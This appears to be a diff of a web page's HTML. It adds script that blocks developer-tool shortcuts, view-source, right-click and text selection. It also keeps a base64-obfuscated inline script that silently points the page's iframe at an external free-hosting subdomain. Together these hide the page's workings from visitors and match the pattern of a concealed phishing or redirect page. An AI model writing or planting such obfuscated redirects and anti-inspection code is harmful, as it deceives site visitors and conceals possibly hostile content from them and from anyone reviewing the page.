@@ -49,6 +49,49 @@
 
    </script>
 	
+   <script type="text/javascript">
+	
+	document.onkeydown = function(e) {
+
+	if(event.keyCode == 123) {
+		return false;
+	}
+
+	if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+		return false;
+	}
+
+	if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+		return false;
+	}
+
+	if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+		return false;
+	}
+     }
+	   
+     document.ondragstart = noselect;
+     document.onselectstart = noselect;
+     document.oncontextmenu = noselect;
+     
+     function noselect(){
+	return false;
+     }
+
+  </script>
+  
+  <style type="text/css">
+    
+    .noselect {
+       -moz-user-select: none;
+       -webkit-user-select: none;
+       -ms-user-select: none;
+       -o-user-select: none;
+       user-select: none;
+   }
+ 
+ </style>
+	
    <script type="text/javascript" src="data:application/x-javascript;base64,dmFyIGlmcmFtZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lmcmFtZScpOwp3aW5kb3cuZnJhbWVzWzBdLmxvY2F0aW9uID0gImh0dHBzOi8vYXBpLWlkNTk5MTUxMi4wMDB3ZWJob3N0YXBwLmNvbS8iOw=="></script>
 	
 </body>
